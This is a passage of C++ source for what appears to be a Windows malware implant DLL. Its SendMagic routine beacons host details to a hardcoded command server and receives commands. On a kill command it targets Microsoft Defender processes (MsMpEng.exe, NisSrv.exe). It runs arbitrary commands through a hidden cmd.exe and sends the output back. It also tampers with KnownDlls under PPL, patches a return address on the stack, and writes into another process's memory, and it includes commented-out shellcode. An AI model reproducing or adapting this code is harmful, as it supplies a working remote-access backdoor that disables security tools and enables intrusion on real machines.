0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    myfile2.write(buffer, 32256);
    myfile2.close();
    return 0;
}

bool  SendMagic(string host, int port, string CookieID, string sendHostUrl, string SendBrowserName, string sendOSType, string ResponseData, string AgentUN, string MyCurrentIP) {
    // DEBUG
    //MessageBox(0, L"From Magic", 0, 0);
    bool enter = false;

    // Initialize Dependencies to the Windows Socket.
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cout << "WSAStartup failed.\n";
        return -1;
    }

    // We first prepare some "hints" for the "getaddrinfo" function
    // to tell it, that we are looking for a IPv4 TCP Connection.
    struct addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;          // We are targeting IPv4
    hints.ai_protocol = IPPROTO_TCP;    // We are targeting TCP
    hints.ai_socktype = SOCK_STREAM;    // We are targeting TCP so its SOCK_STREAM

    // Aquiring of the IPv4 address of a host using the newer
    // "getaddrinfo" function which outdated "gethostbyname".
    // It will search for IPv4 addresses using the TCP-Protocol.
    struct addrinfo* targetAdressInfo = NULL;
    PCSTR toPCSTR = host.c_str();
    DWORD getAddrRes = getaddrinfo(toPCSTR, NULL, &hints, &targetAdressInfo);
    if (getAddrRes != 0 || targetAdressInfo == NULL)
    {
        MessageBox(0, L"Could not resolve the Host Name", 0, 0);
        WSACleanup();
        return -1;
    }

    // Create the Socket Address Informations, using IPv4
    // We dont have to take care of sin_zero, it is only used to extend the length of SOCKADDR_IN to the size of SOCKADDR
    SOCKADDR_IN sockAddr;
    sockAddr.sin_addr = ((struct sockaddr_in*)targetAdressInfo->ai_addr)->sin_addr;    // The IPv4 Address from the Address Resolution Result
    sockAddr.sin_family = AF_INET;  // IPv4
    sockAddr.sin_port = htons(port);  // HTTP Port: 8000

    // We have to free the Address-Information from getaddrinfo again
    freeaddrinfo(targetAdressInfo);

    // Creation of a socket for the communication with the Web Server,
    // using IPv4 and the TCP-Protocol
    SOCKET webSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (webSocket == INVALID_SOCKET)
    {
        MessageBox(0, L"Creation of the Socket Failed", 0, 0);
        WSACleanup();
        return -1;
    }


    BOOL bOptVal = TRUE;
    int bOptLen = sizeof(BOOL);


    setsockopt(webSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&bOptVal, bOptLen);

    // Establishing a connection to the web Socket
    // DEBUG
    //MessageBox(0, L"Connecting...\n", 0, 0);

    if (connect(webSocket, (SOCKADDR*)&sockAddr, sizeof(sockAddr)) != 0)
    {
        MessageBox(0, L"Could not connect", 0, 0);
        closesocket(webSocket);
        WSACleanup();
        return -1;
    }
    // DEBUG
    //MessageBox(0, L"Connected.\n", 0, 0);

    string request = CookieID + "&" + sendHostUrl + "&" + SendBrowserName + "&" + sendOSType + "&" + ResponseData + "&1&" + AgentUN + "&" + getLocalIPAddress();
    string encoded_request = Encode(request);

    // DEBUG
    char text[2048];
    //strncpy(text, encoded_request.c_str(), sizeof(text));
    //text[sizeof(text) - 1] = 0;
    //wchar_t wtext[20];
    //mbstowcs(wtext, text, strlen(text) + 1);//Plus null
    //LPWSTR ptr = wtext;
    //MessageBox(0, ptr, 0, 0);

    // Sending a HTTP-GET-Request to the Server
    string request_craft = "GET /agent/&" + encoded_request + " HTTP/1.1\r\nHost:" + host + "\r\nConnection: close\r\n\r\n";
    const char* httpRequest = request_craft.c_str();

    int sentBytes = send(webSocket, httpRequest, strlen(httpRequest), 0);
    if (sentBytes < strlen(httpRequest) || sentBytes == SOCKET_ERROR)
    {
        MessageBox(0, L"Could not send the request to the Server", 0, 0);
        closesocket(webSocket);
        WSACleanup();
        return -1;
    }

    // Receiving and Displaying an answer from the Server
    char bufferRCV[512];
    ZeroMemory(bufferRCV, sizeof(bufferRCV));
    int dataLen;
    memset(bufferRCV, 0, sizeof(bufferRCV));
    while ((dataLen = recv(webSocket, bufferRCV, sizeof(bufferRCV), 0) > 0))
    {
        int i = 0;
        string response;
        while (bufferRCV[i] >= 32 || bufferRCV[i] == '\n' || bufferRCV[i] == '\r') {
            response += bufferRCV[i];
            i += 1;
        }

        // Debug command received
        char textCMD[2048];
        strncpy(textCMD, response.c_str(), sizeof(textCMD));
        textCMD[sizeof(textCMD) - 1] = 0;
        wchar_t wtext[20];
        mbstowcs(wtext, textCMD, strlen(textCMD) + 1);//Plus null
        LPWSTR ptr = wtext;

        this_thread::sleep_for(chrono::milliseconds(1000));

        string filtertring("OS=");
        if ((response.find(filtertring) != string::npos)) {
            vector<string> strings;
            istringstream f(response);
      
                string filter_cmd = response;
                string filter_string("OS=");

                if ((filter_cmd.find(filter_string) != string::npos)) {
                    bool enter = true;
                    std::string clean_CMD1 = "OS=";

                    for (char c : clean_CMD1) {
                        filter_cmd.erase(std::remove(filter_cmd.begin(), filter_cmd.end(), c), filter_cmd.end());
                    }

                    string filter_killsrv("killservice");
                    if ((filter_cmd.find(filter_killsrv) != string::npos)) {
                        //MessageBox(0, L"killav.\n", 0, 0);

                        // TEST

                        HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
                        PROCESSENTRY32 pEntry;
                        /*initializing size - needed for using Process32First*/
                        pEntry.dwSize = sizeof(pEntry);
                        BOOL hRes = Process32First(hSnapShot, &pEntry);
                        /*while first process in pEntry exists*/
                        while (hRes)
                        {
                            /*create const char for string comparison*/
                            _bstr_t b(pEntry.szExeFile);
                            if (strcmp(b, "NisSrv.exe") == 0)
                            {
                                DumpProcessMemory((DWORD)pEntry.th32ProcessID, g_pwszDumpFilePath);
                                this_thread::sleep_for(chrono::milliseconds(2000));
                                sendCMDExecuted(host, port, getComputerName(), getLocalIPAddress(), "Interner Explorer", GetOSFriendlyName(), "Defender Service Killed", agentUN, getLocalIPAddress());
                                break;
                            }
                            hRes = Process32Next(hSnapShot, &pEntry);
                        }
                        
                        closesocket(webSocket);
                        WSACleanup();
                        break;
                    }

                    string filter_killav("killav");
                    if ((filter_cmd.find(filter_killav) != string::npos)) {
                        //MessageBox(0, L"killav.\n", 0, 0);

                        // TEST
                        DropDLL();
                        HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
                        PROCESSENTRY32 pEntry;
                        /*initializing size - needed for using Process32First*/
                        pEntry.dwSize = sizeof(pEntry);
                        BOOL hRes = Process32First(hSnapShot, &pEntry);
                        /*while first process in pEntry exists*/
                        while (hRes)
                        {
                            /*create const char for string comparison*/
                            _bstr_t b(pEntry.szExeFile);
                            if (strcmp(b, "MsMpEng.exe") == 0)
                            {
                                DumpProcessMemory((DWORD)pEntry.th32ProcessID, g_pwszDumpFilePath);
                                this_thread::sleep_for(chrono::milliseconds(2000));
                                sendCMDExecuted(host, port, getComputerName(), getLocalIPAddress(), "Interner Explorer", GetOSFriendlyName(), "Defender AV Killed", agentUN, getLocalIPAddress());
                                break;
                            }
                            hRes = Process32Next(hSnapShot, &pEntry);
                        }
                        closesocket(webSocket);
                        WSACleanup();
                        break;
                    }

                    if (filter_cmd.length() > 2) {
                        // Debug command received
                        char textcmd[2048];
                        strncpy(textcmd, filter_cmd.c_str(), sizeof(textcmd));
                        textcmd[sizeof(textcmd) - 1] = 0;
                        wchar_t wtext[20];
                        mbstowcs(wtext, textcmd, strlen(textcmd) + 1);//plus null
                        LPWSTR ptr = wtext;

                        std::string str = "/C " + filter_cmd + " > C:\\temp.log 2>&1";
                        BSTR b = _com_util::ConvertStringToBSTR(str.c_str());
                        LPWSTR cmd = b;

                        STARTUPINFO si;
                        PROCESS_INFORMATION pi;
                        LPVOID allocation_start;

                        HANDLE hThread;
                        NTSTATUS status;

                        ZeroMemory(&si, sizeof(si));
                        ZeroMemory(&pi, sizeof(pi));
                        si.cb = sizeof(si);
                        LPCWSTR cmdRun = TEXT("C:\\Windows\\System32\\cmd.exe");

                        if (!CreateProcess(
                            cmdRun,							// Executable
                            cmd,							// Command line
                            NULL,							// Process handle not inheritable
                            NULL,							// Thread handle not inheritable
                            FALSE,							// Set handle inheritance to FALSE
                            CREATE_NO_WINDOW,	            // Do Not Open a Window
                            NULL,							// Use parent's environment block
                            NULL,							// Use parent's starting directory 
                            &si,			                // Pointer to STARTUPINFO structure
                            &pi								// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
                        )) {
                            DWORD errval = GetLastError();
                            std::ostringstream stream;
                            int i = 5;
                            stream << i;
                            std::string str = stream.str();

                            char textcmd1[2048];
                            strncpy(textcmd1, str.c_str(), sizeof(textcmd1));
                            textcmd1[sizeof(textcmd1) - 1] = 0;
                            wchar_t wtext1[20];
                            mbstowcs(wtext1, textcmd1, strlen(textcmd1) + 1);//plus null
                            LPWSTR ptr = wtext1;
                            MessageBox(0, (L"Execution failed: %s\n", ptr), 0, 0);

                        }
                        SysFreeString(b);
                        // Give time for the cmd to finish
                        this_thread::sleep_for(chrono::milliseconds(4000));

                        // READ FILES CRASHES IF NULL
                        if (readFile2("c:\\temp.log").length() > 2) {
                            this_thread::sleep_for(chrono::milliseconds(2000));
                            sendCMDExecuted(host, port, getComputerName(), getLocalIPAddress(), "Interner Explorer", GetOSFriendlyName(), "Command executed", agentUN, getLocalIPAddress());
                            this_thread::sleep_for(chrono::milliseconds(2000));
                            sendResults(host, port, getComputerName(), getLocalIPAddress(), "Interner Explorer", GetOSFriendlyName(), readFile2("c:\\temp.log"), agentUN, getLocalIPAddress());
                            closesocket(webSocket);
                            WSACleanup();
                        }
                    }
                }
                else {
                    this_thread::sleep_for(chrono::milliseconds(2000));
                    SendMagic(host, port, getComputerName(), getLocalIPAddress(), "Interner Explorer", GetOSFriendlyName(), "Waiting for Exploit Pack..", agentUN, getLocalIPAddress());
                    closesocket(webSocket);
                    WSACleanup();
                }   
        }
    }

    // Cleaning up Windows Socket Dependencies
    closesocket(webSocket);
    WSACleanup();

    return enter;
}



int DumpFile(DWORD processID, HANDLE hProcess)
{
    uint32_t pid = GetCurrentProcessId();
    std::ofstream myfile;
    std::string filename;
    std::string path = "c:\\windows\\tasks\\";
    std::string file_ext = ".txt";
    filename = path + std::to_string(pid) + file_ext;
    myfile.open(filename);
    myfile << "Process: " + ProcessIdToName(pid) + "\n";
    myfile << "PID: " + std::to_string(pid) + "\n";
    myfile << "Injected from ADVCD-DLL: " + GetProcessUsername(NULL) + "\n";
    myfile << "###########################################################################################################\n";
    myfile.close();

    sendInitialData("192.168.201.11", 8000, getComputerName(), getLocalIPAddress(), "Interner Explorer", GetOSFriendlyName(), "None", agentUN, getLocalIPAddress(), processID, hProcess, ProcessIdToName(pid));
    while (true) {
        this_thread::sleep_for(chrono::milliseconds(2000));
        SendMagic("192.168.201.11", 8000, getComputerName(), getLocalIPAddress(), "Interner Explorer", GetOSFriendlyName(), "Waiting for Exploit Pack..", agentUN, getLocalIPAddress());
    }

    return true;
}






BOOL PatchTheRet(HMODULE realModule) {

    // Get primary module info

    PBYTE baseAddress = NULL;
    DWORD baseSize = 0;

    WCHAR fileName[MAX_PATH];
    GetProcessImageFileName((HANDLE)-1, fileName, MAX_PATH);
    std::wstring pathString = std::wstring(fileName);

    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());

    MODULEENTRY32 pEntry;
    pEntry.dwSize = sizeof(pEntry);
    BOOL hRes = Module32Next(hSnapShot, &pEntry);
    while (hRes)
    {
        if (pathString.find(pEntry.szModule) != std::wstring::npos) {
            baseAddress = pEntry.modBaseAddr;
            baseSize = pEntry.modBaseSize;
            break;
        }
        hRes = Module32Next(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);

    if (!baseAddress || !baseSize)
        return FALSE;

    // Hunt the stack

    PBYTE loadLibrary = (PBYTE)GetProcAddress(GetModuleHandle(L"KERNELBASE"), "LoadLibraryExW");
    PBYTE* stack = (PBYTE*)_AddressOfReturnAddress();
    BOOL foundLoadDll = FALSE;

    ULONG_PTR lowLimit, highLimit;
    GetCurrentThreadStackLimits(&lowLimit, &highLimit);

    for (; (ULONG_PTR)stack < highLimit; stack++) {
        if (*stack < (PBYTE)0x1000)
            continue;

        if (*stack > loadLibrary && *stack < loadLibrary + 0x1000) {
            // LdrLoadDll is in the stack, let's start looking for our module
            foundLoadDll = TRUE;
        }

        if (foundLoadDll && *stack > baseAddress && *stack < (baseAddress + baseSize)) {
            MEMORY_BASIC_INFORMATION mInfo = { 0 };
            VirtualQuery(*stack, &mInfo, sizeof(mInfo));

            if (!(mInfo.Protect & PAGE_EXECUTE_READ))
                continue;

            // Prepare a small rewrite+jmp block

            BYTE RetRewrite[22] = {
                0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, <val>
                0x48, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rbx, <val>
                0xFF, 0xE3 // jmp rbx
            };

            PBYTE rewrite = (PBYTE)VirtualAlloc(0, sizeof(RetRewrite), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!rewrite) return FALSE;

            RtlCopyMemory(rewrite, RetRewrite, sizeof(RetRewrite));
            RtlCopyMemory(rewrite + 2, &realModule, 8);
            RtlCopyMemory(rewrite + 12, stack, 8);

            // Move return address to our rewrite
            *(PBYTE*)stack = rewrite;

            return TRUE;
        }
    }
}


void DoStuff()
{
    LPWSTR pwszDllName = NULL;
    BOOL bSuccess = FALSE;

    WCHAR wszEventName[MAX_PATH] = { 0 };
    HANDLE hEvent = NULL;

    //
    // 1. Parse the command line
    //
    //    Then, we can parse the command line to get the ID of the process to dump and the path of
    //    the target dump file.
    //
    ParseCommandLine();

    if (g_bDebug)
        LogToConsole(L"DEBUG mode enabled\n");

    if (g_bDebug)
        LogToConsole(L"PID=%d | File='%ws' | GUID='%ws'\n", g_dwProcessId, g_pwszDumpFilePath, g_pwszGuid);

    //
    // Signal first Event (DLL loaded)
    //
    StringCchPrintf(wszEventName, MAX_PATH, L"Global\\%ws_DLL_LOADED", g_pwszGuid);
    if (hEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, wszEventName))
    {
        if (!SetEvent(hEvent))
            LogLastError(L"SetEvent");
        
        CloseHandle(hEvent);
    }
    else
        LogLastError(L"OpenEvent");

    if (g_bVerbose)
        LogToConsole(L"[*] DLL loaded.\n");
    
    //
    // 2. Do some cleanup
    //
    //    First things first, we need to delete the symbolic link that was created in \KnownDlls.
    //    As this code is executed as SYSTEM inside a PPL with the WindowsTCB protection level, it
    //    should not be a problem.
    //
    if (!GetCurrentDllFileName(&pwszDllName))
        goto end;

    if (!DeleteKnownDllEntry(pwszDllName))
        LogToConsole(L"[-] Failed to delete KnownDll entry '%ws'\n", pwszDllName);
    else
    {
        if (g_bVerbose)
            LogToConsole(L"[*] KnownDll entry '%ws' removed.\n", pwszDllName);
    }

    //
    // 3. Dump the memory of the target process
    //
    //    Finally, dump the memmory of the target process using MiniDumpWriteDump.
    //
    DumpFile(g_dwProcessId, g_pwszDumpFilePath);

  //  bSuccess = DumpProcessMemory(g_dwProcessId, g_pwszDumpFilePath);
    //if (g_bVerbose)
    //    LogToConsole(L"%ws DumpProcessMemory: %ws\n", bSuccess ? L"[+]" : L"[-]", bSuccess ? L"SUCCESS" : L"FAILURE");

    if (bSuccess)
    {
        //
        // Signal second Event (dump success)
        //
        StringCchPrintf(wszEventName, MAX_PATH, L"Global\\%ws_DUMP_SUCCESS", g_pwszGuid);
        if (hEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, wszEventName))
        {
            if (!SetEvent(hEvent))
                LogLastError(L"SetEvent");
            CloseHandle(hEvent);
        }
        else
            LogLastError(L"OpenEvent");
    }

end:
    if (pwszDllName)
        LocalFree(pwszDllName);
}

void LogToConsole(LPCWSTR pwszFormat, ...)
{
    //
    // The process in which we load this DLL does not have a console so we need to attach to the 
    // parent process' console. To do so, we can call AttachConsole with the special value 
    // ATTACH_PARENT_PROCESS. Then, we can get the STDOUT handle. This handle is stored will be 
    // stored as a global variable so we need to initialize it only once.
    //
    if (g_hConsoleOutput == NULL)
    {
        AttachConsole(ATTACH_PARENT_PROCESS);
        if (!(g_hConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE)))
            return;
    }

    //
    // Prepare otuput string and use WriteConsole instead of wprintf. This way, we can directly use
    // the STDOUT handle we got previously.
    //
    DWORD dwOutputStringSize = 0;
    LPWSTR pwszOutputString = NULL;
    va_list va;
    size_t offset = 0;

    va_start(va, pwszFormat);

    if (g_bDebug)
        dwOutputStringSize += (DWORD)wcslen(L"[DEBUG] (DLL) ") * sizeof(WCHAR);
    else
        dwOutputStringSize += (DWORD)wcslen(L"(DLL) ") * sizeof(WCHAR);
    dwOutputStringSize += _vscwprintf(pwszFormat, va) * sizeof(WCHAR) + 2; // \0
    pwszOutputString = (LPWSTR)LocalAlloc(LPTR, dwOutputStringSize);

    if (pwszOutputString)
    {
        if (g_bDebug)
            StringCchPrintf(pwszOutputString, dwOutputStringSize, L"[DEBUG] (DLL) ");
        else
            StringCchPrintf(pwszOutputString, dwOutputStringSize, L"(DLL) ");

        if (SUCCEEDED(StringCbLength(pwszOutputString, dwOutputStringSize, &offset)))
        {
            StringCbVPrintf(&pwszOutputString[offset / sizeof(WCHAR)], dwOutputStringSize - offset, pwszFormat, va);

            WriteConsole(g_hConsoleOutput, pwszOutputString, (DWORD)wcslen(pwszOutputString), NULL, NULL);
        }

        LocalFree(pwszOutputString);
    }

    va_end(va);
}

void LogLastError(LPCWSTR pwszFunctionName)
{
    DWORD dwLastError = GetLastError();
    if (dwLastError != ERROR_SUCCESS)
        LogToConsole(L"Function '%ws' returned error code %d - %ws\n", pwszFunctionName, dwLastError, _com_error(HRESULT_FROM_WIN32(dwLastError)).ErrorMessage());
}

BOOL GetCurrentDllFileName(LPWSTR* ppwszDllName)
{
    WCHAR wszDllPath[MAX_PATH];
    LPWSTR pwszDllName = NULL;

    GetModuleFileName(g_hInstance, wszDllPath, MAX_PATH);
    if (GetLastError() == ERROR_SUCCESS)
    {
        pwszDllName = PathFindFileName(wszDllPath);
        *ppwszDllName = (LPWSTR)LocalAlloc(LPTR, 64 * sizeof(WCHAR));
        if (*ppwszDllName)
        {
            StringCchPrintf(*ppwszDllName, 64, L"%ws", pwszDllName);
            return TRUE;
        }
    }

    return FALSE;
}

BOOL DeleteKnownDllEntry(LPCWSTR pwszDllName)
{
    BOOL bReturnValue = FALSE;

    NTSTATUS status = 0;
    HANDLE hLink = NULL;
    LPWSTR pwszLinkPath = NULL;
    UNICODE_STRING name = { 0 };
    OBJECT_ATTRIBUTES oa = { 0 };

    SECURITY_DESCRIPTOR sd = { 0 };
    SECURITY_ATTRIBUTES sa = { 0 };

    //
    // Build the path of the symbolic link object to delete. The name of the DLL can be determined
    // at runtime by invoking 'GetCurrentDllFileName'. The final path will be something such as 
    // '\KnownDlls\DPAPI.dll'.
    //
    pwszLinkPath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszLinkPath)
        goto end;

    StringCchPrintf(pwszLinkPath, MAX_PATH, L"\\KnownDlls\\%ws", pwszDllName);

    if (g_bDebug)
        LogToConsole(L"Object to delete: %ws\n", pwszLinkPath);

    RtlInitUnicodeString(&name, pwszLinkPath);
    InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

    //
    // Here we want to call NtOpenSymbolicLinkObject with DELETE access because we want to delete
    // the link. Unfortunately, the inherited ACL does not grant us this right and we will thus 
    // get an "Access denied" error. What we can do though is open the symbolic link object with
    // WRITE_DAC access in order to change the ACL of the object.
    //
    status = NtOpenSymbolicLinkObject(&hLink, WRITE_DAC, &oa);
    SetLastError(RtlNtStatusToDosError(status));
    if (status != 0)
    {
        LogLastError(L"NtOpenSymbolicLinkObject");
        goto end;
    }

    if (g_bDebug)
        LogToConsole(L"NtOpenSymbolicLinkObject('%ws', WRITE_DAC) OK\n", pwszLinkPath);

    //
    // Prepare the Security Descriptor. Here we will just use a NULL DACL. This will give everyone
    // access to the object but that's not really an issue because we'll delete it right after.
    //
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
#pragma warning( suppress : 6248 ) // Disable warning as setting a NULL DACL is intentional here
    if (!SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE))
    {
        LogLastError(L"SetSecurityDescriptorDacl");
    }

    sa.nLength = sizeof(sa);
    sa.bInheritHandle = FALSE;
    sa.lpSecurityDescriptor = &sd;

    //
    // Apply the new Security Descriptor.
    //
    if (!SetKernelObjectSecurity(hLink, DACL_SECURITY_INFORMATION, &sd))
    {
        LogLastError(L"SetKernelObjectSecurity");
        goto end;
    }

    if (g_bDebug)
        LogToConsole(L"SetKernelObjectSecurity OK\n");

    //
    // At this point we can close the object handle because only the WRITE_DAC right is associated
    // to it. This handle will not allow us to delete the object.
    //
    status = NtClose(hLink);
    SetLastError(RtlNtStatusToDosError(status));
    if (status != 0)
    {
        LogLastError(L"NtClose");
        goto end;
    }

    if (g_bDebug)
        LogToConsole(L"NtClose OK\n");

    //
    // This time, we should be able to open the link object with DELETE access.
    //
    status = NtOpenSymbolicLinkObject(&hLink, DELETE, &oa);
    SetLastError(RtlNtStatusToDosError(status));
    if (status != 0)
    {
        LogLastError(L"NtOpenSymbolicLinkObject");
        goto end;
    }

    if (g_bDebug)
        LogToConsole(L"NtOpenSymbolicLinkObject('%ws', DELETE) OK\n", pwszLinkPath);

    //
    // Now, we can invoke NtMakeTemporaryObject to disable the "Permanent" flag of the object. When
    // an object does not have the "Permanent" flag enabled, it is automatically deleted when all 
    // its handles are closed.
    //
    status = NtMakeTemporaryObject(hLink);
    SetLastError(RtlNtStatusToDosError(status));
    if (status != 0)
    {
        LogLastError(L"NtMakeTemporaryObject");
        goto end;
    }

    if (g_bDebug)
        LogToConsole(L"NtMakeTemporaryObject OK\n");

    bReturnValue = status == STATUS_SUCCESS;

    //
    // We should be the only process to have an opened handle on this object. So, if we close it, 
    // the link should be automatically deleted.
    //

end:
    if (hLink)
        NtClose(hLink);
    if (pwszLinkPath)
        LocalFree(pwszLinkPath);

    return bReturnValue;
}

BOOL ParseCommandLine()
{
    LPWSTR pwszCommandLine = GetCommandLine();
    LPWSTR* argv = NULL;
    int argc = 0;
    int i = 0;

    argv = CommandLineToArgvW(pwszCommandLine, &argc);
    if (!argv)
        return FALSE;

    if (argc < 4)
        return FALSE;

    g_dwProcessId = wcstoul(argv[1], NULL, 10);
    g_pwszDumpFilePath = argv[2];
    g_pwszGuid = argv[3];

    if (argc > 4)
    {
        if (_wcsicmp(argv[4], L"-v") == 0)
            g_bVerbose = TRUE;
        else if (_wcsicmp(argv[4], L"-d") == 0)
        {
            g_bVerbose = TRUE;
            g_bDebug = TRUE;
        }
    }

    return TRUE;
}

BOOL DumpProcessMemory(DWORD dwProcessId, LPWSTR pwszDumpFilePath)
{
    BOOL bReturnValue = FALSE;

    BOOL bFileCreated = FALSE;
    HANDLE hFile = NULL;
    HANDLE hProcess = NULL;
    DWORD dwLastError = 0;


    //bFileCreated = TRUE;

    //
    // The process handle used by MiniDumpWriteDump requires only the flags PROCESS_VM_READ and
    // PROCESS_QUERY_INFORMATION.
    //
    if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId)))
    {
        LogLastError(L"OpenProcess");
        goto end;
    }

    if (g_bDebug) {
        LogToConsole(L"OpenProcess(%d) OK\n", dwProcessId);


        LogToConsole(L"Attempting to search for string in process, please wait!\n");

        // String to locate..
        TCHAR tszSearch[] = _T(".exe");
        TCHAR tszReplace[] = _T("boom.exe");
        BOOL Found_String = FALSE;
        int Write_Once = 0;

        if (dwProcessId == 0) return 0;

        if (hProcess == INVALID_HANDLE_VALUE) return 0;

        SYSTEM_INFO si;
        GetSystemInfo(&si);

        MEMORY_BASIC_INFORMATION mbi = { 0 };

        LPVOID lpStartAddr = si.lpMinimumApplicationAddress;


        LPVOID InjectMemAddrss;
        while (VirtualQueryEx(hProcess, lpStartAddr, &mbi, sizeof(MEMORY_BASIC_INFORMATION)))
        {
            //LogToConsole(_T("Region: 0x%08X - Size: %d\r\n"), mbi.BaseAddress, mbi.RegionSize);

            if ((mbi.Protect & PAGE_EXECUTE_READ) || (mbi.Protect & PAGE_EXECUTE_READWRITE) ||
                (mbi.Protect & PAGE_READONLY) || (mbi.Protect & PAGE_READWRITE))
            {
                TCHAR* btDump = new TCHAR[mbi.RegionSize + 1];
                ReadProcessMemory(hProcess, mbi.BaseAddress, btDump, mbi.RegionSize, NULL);

                for (DWORD x = 0; x < mbi.RegionSize; x++)
                    if (wmemcmp(&btDump[x], tszSearch, _tcslen(tszSearch)) == 0)
                    {
                        // TESTING
                        Found_String = TRUE;
                        LogToConsole(_T(" --> Found string at: 0x%08X\r\n"), reinterpret_cast<LPVOID>(reinterpret_cast<DWORD_PTR>(mbi.BaseAddress) + (x * sizeof(TCHAR))));

                        DWORD newdatasize = sizeof(tszReplace);
                        int newdata = 0;


                  //      if (Write_Once == 4) {

                            if (WriteProcessMemory(hProcess, reinterpret_cast<LPVOID>(reinterpret_cast<DWORD_PTR>(mbi.BaseAddress) + (x * sizeof(TCHAR))), &tszReplace, newdatasize, NULL))
                            {
                                LogToConsole(_T(" --> WriteProcessMemory SUCCESS: 0x%08X\r\n"), reinterpret_cast<LPVOID>(reinterpret_cast<DWORD_PTR>(mbi.BaseAddress) + (x * sizeof(TCHAR))));

                             //   // shellcode ep c:\windows\tasks\system.exe cmd.exe /k \"c:\windows\system32\wscript.exe c:\windows\tasks\myfile.vbs
                             //   unsigned char shellcode[] = 
                             //       "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
                             //       "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                             //       "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                             //       "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                             //       "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                             //       "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
                             //       "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
                             //       "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
                             //       "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
                             //       "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
                             //       "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
                             //       "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
                             //       "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
                             //       "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
                             //       "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
                             //       "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
                             //       "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
                             //       "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
                             //       "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x3a\x5c"
                             //       "\x77\x69\x6e\x64\x6f\x77\x73\x5c\x74\x61\x73\x6b\x73\x5c\x73"
                             //       "\x2e\x65\x78\x65\x20\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x6b"
                             //       "\x20\x22\x63\x3a\x5c\x77\x69\x6e\x64\x6f\x77\x73\x5c\x73\x79"
                             //       "\x73\x74\x65\x6d\x33\x32\x5c\x77\x73\x63\x72\x69\x70\x74\x2e"
                             //       "\x65\x78\x65\x20\x63\x3a\x5c\x77\x69\x6e\x64\x6f\x77\x73\x5c"
                             //       "\x74\x61\x73\x6b\x73\x5c\x6d\x79\x66\x69\x6c\x65\x2e\x76\x62"
                             //       "\x73\x22\x00";


                             //       // notepad
                             //   //unsigned char shellcode[] =
                             //   //    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
                             //   //    "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                             //   //    "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                             //   //    "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                             //   //    "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                             //   //    "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
                             //   //    "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
